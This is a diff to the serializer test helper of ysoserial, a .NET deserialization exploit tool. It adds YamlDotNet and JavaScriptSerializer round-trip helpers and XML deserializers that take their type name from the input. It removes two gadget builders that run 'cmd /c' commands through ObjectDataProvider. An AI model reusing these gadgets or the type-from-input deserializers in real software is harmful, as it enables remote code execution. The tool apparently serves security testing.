@@ -9,14 +9,16 @@ using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Runtime.Serialization.Formatters.Soap;
 using System.Text;
+using System.Web.Script.Serialization;
 using System.Web.UI;
 using System.Windows;
 using System.Windows.Data;
 using System.Windows.Markup;
 using System.Xml;
 using System.Xml.Serialization;
+using YamlDotNet.Serialization;
 
-namespace ysoserial.Helpers.DevTest
+namespace ysoserial.Helpers
 {
     class SerializersHelper
     {
@@ -118,6 +120,27 @@ namespace ysoserial.Helpers.DevTest
                 Console.WriteLine("\tError in ObjectStateFormatter!");
             }
 
+            try
+            {
+                Console.WriteLine("\n~~YamlDotNet:~~\n");
+                Console.WriteLine(YamlDotNet_serialize(myobj));
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("\tError in YamlDotNet!");
+            }
+
+            try
+            {
+                Console.WriteLine("\n~~JavaScriptSerializer:~~\n");
+                Console.WriteLine(JavaScriptSerializer_serialize(myobj));
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("\tError in JavaScriptSerializer!");
+            }
+
+
         }
 
         public static void TestAll(object myobj)
@@ -136,6 +159,8 @@ namespace ysoserial.Helpers.DevTest
             BinaryFormatter_test(myobj);
             LosFormatter_test(myobj);
             ObjectStateFormatter_test(myobj);
+            YamlDotNet_test(myobj);
+            JavaScriptSerializer_test(myobj);
         }
 
         public static void XmlSerializer_test(object myobj)
@@ -172,8 +197,27 @@ namespace ysoserial.Helpers.DevTest
 
         public static object XMLSerializer_deserialize(string str, string type)
         {
-            var s = new XmlSerializer(Type.GetType(type));
-            object obj = s.Deserialize(new XmlTextReader(new StringReader(str)));
+            return XMLSerializer_deserialize(str, type, "");
+        }
+
+        public static object XMLSerializer_deserialize(string str, string type, string rootElement)
+        {
+            object obj = null; 
+
+            if (!rootElement.Equals(""))
+            {
+                var xmlDoc = new XmlDocument();
+                xmlDoc.LoadXml(str);
+                XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode(rootElement);
+                var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
+                obj = s.Deserialize(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+            }
+            else
+            {
+                var s = new XmlSerializer(Type.GetType(type));
+                obj = s.Deserialize(new XmlTextReader(new StringReader(str)));
+            }
+            
             return obj;
         }
 
@@ -222,9 +266,26 @@ namespace ysoserial.Helpers.DevTest
 
         public static object DataContractSerializer_deserialize(string str, string type)
         {
-            var s = new DataContractSerializer(Type.GetType(type));
+            return DataContractSerializer_deserialize(str, type, "");
+        }
 
-            object obj = s.ReadObject(new XmlTextReader(new StringReader(str)));
+        public static object DataContractSerializer_deserialize(string str, string type, string rootElement)
+        {
+            object obj = null;
+            
+            if (!rootElement.Equals(""))
+            {
+                var xmlDoc = new XmlDocument();
+                xmlDoc.LoadXml(str);
+                XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode(rootElement);
+                var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
+                obj = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+            }
+            else
+            {
+                var s = new DataContractSerializer(Type.GetType(type));
+                obj = s.ReadObject(new XmlTextReader(new StringReader(str)));
+            }
             return obj;
         }
 
@@ -292,10 +353,27 @@ namespace ysoserial.Helpers.DevTest
 
         public static object NetDataContractSerializer_deserialize(string str)
         {
+            return NetDataContractSerializer_deserialize(str, "");
+        }
+
+        public static object NetDataContractSerializer_deserialize(string str, string rootElement)
+        {
+            object obj = null;
             var s = new NetDataContractSerializer();
-            byte[] serializedData = Encoding.UTF8.GetBytes(str);
-            MemoryStream ms = new MemoryStream(serializedData);
-            object obj = s.Deserialize(ms);
+            if (!rootElement.Equals(""))
+            {
+                var xmlDoc = new XmlDocument();
+                xmlDoc.LoadXml(str);
+                XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode(rootElement);
+                obj = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+            }
+            else
+            {
+                byte[] serializedData = Encoding.UTF8.GetBytes(str);
+                MemoryStream ms = new MemoryStream(serializedData);
+                obj = s.Deserialize(ms);
+            }
+
             return obj;
         }
 
@@ -384,7 +462,6 @@ namespace ysoserial.Helpers.DevTest
             BinaryFormatter sf = new BinaryFormatter();
             return sf.Deserialize(ms);
         }
-
         public static void LosFormatter_test(object myobj)
         {
             try
@@ -399,18 +476,15 @@ namespace ysoserial.Helpers.DevTest
 
         public static string LosFormatter_serialize(object myobj)
         {
-            LosFormatter sf = new LosFormatter();
-            MemoryStream ms = new MemoryStream();
-            sf.Serialize(ms, myobj);
-            return Convert.ToBase64String(ms.ToArray());
+            StringWriter s = new StringWriter(CultureInfo.InvariantCulture);
+            new LosFormatter().Serialize(s, myobj);
+
+            return s.ToString();
         }
 
         public static object LosFormatter_deserialize(string str)
         {
-            byte[] byteArray = Convert.FromBase64String(str);
-            MemoryStream ms = new MemoryStream(byteArray);
-            LosFormatter sf = new LosFormatter();
-            return sf.Deserialize(ms);
+            return new LosFormatter().Deserialize(str);
         }
 
         public static void ObjectStateFormatter_test(object myobj)
@@ -427,52 +501,67 @@ namespace ysoserial.Helpers.DevTest
 
         public static string ObjectStateFormatter_serialize(object myobj)
         {
-            ObjectStateFormatter sf = new ObjectStateFormatter();
-            MemoryStream ms = new MemoryStream();
-            sf.Serialize(ms, myobj);
-            return Convert.ToBase64String(ms.ToArray());
+            return new ObjectStateFormatter().Serialize(myobj);
         }
 
         public static object ObjectStateFormatter_deserialize(string str)
         {
-            byte[] byteArray = Convert.FromBase64String(str);
-            MemoryStream ms = new MemoryStream(byteArray);
-            ObjectStateFormatter sf = new ObjectStateFormatter();
-            return sf.Deserialize(ms);
+            return new ObjectStateFormatter().Deserialize(str);
         }
 
-        public static object ObjectDataProviderGadget(string cmd)
+        public static void YamlDotNet_test(object myobj)
         {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "cmd";
-            psi.Arguments = "/c " + cmd;
-            StringDictionary dict = new StringDictionary();
-            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
-            Process p = new Process();
-            p.StartInfo = psi;
-            ObjectDataProvider odp = new ObjectDataProvider();
-            odp.MethodName = "Start";
-            odp.IsInitialLoadEnabled = false;
-            odp.ObjectInstance = p;
-            return odp;
+            try
+            {
+                YamlDotNet_deserialize(YamlDotNet_serialize(myobj));
+            }
+            catch (Exception e)
+            {
+                //ignore
+            }
         }
 
-        public static object ResourceDictionaryGadget(string cmd)
+        public static string YamlDotNet_serialize(object myobj)
         {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "cmd";
-            psi.Arguments = "/c " + cmd;
-            StringDictionary dict = new StringDictionary();
-            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
-            Process p = new Process();
-            p.StartInfo = psi;
-            ObjectDataProvider odp = new ObjectDataProvider();
-            odp.MethodName = "Start";
-            odp.IsInitialLoadEnabled = false;
-            odp.ObjectInstance = p;
-            ResourceDictionary myResourceDictionary = new ResourceDictionary();
-            myResourceDictionary.Add("odp", odp);
-            return myResourceDictionary;
+            var serializer = new SerializerBuilder().Build();
+            var yaml = serializer.Serialize(myobj);
+            return yaml;
+        }
+
+        public static object YamlDotNet_deserialize(string str)
+        {
+            object result = null;
+            //to bypass all of the vulnerable version's type checking, we need to set up a stream
+            using (var reader = new StreamReader(new MemoryStream(System.Text.Encoding.UTF8.GetBytes(str))))
+            {
+                var deserializer = new DeserializerBuilder().Build();
+                result = deserializer.Deserialize(reader);
+            }
+            return result;
+        }
+
+        public static void JavaScriptSerializer_test(object myobj)
+        {
+            try
+            {
+                JavaScriptSerializer_deserialize(JavaScriptSerializer_serialize(myobj));
+            }
+            catch (Exception e)
+            {
+                //ignore
+            }
+        }
+
+        public static string JavaScriptSerializer_serialize(object myobj)
+        {
+            JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
+            return jss.Serialize(myobj);
+        }
+
+        public static object JavaScriptSerializer_deserialize(string str)
+        {
+            JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
+            return jss.Deserialize<Object>(str);
         }
     }
 }
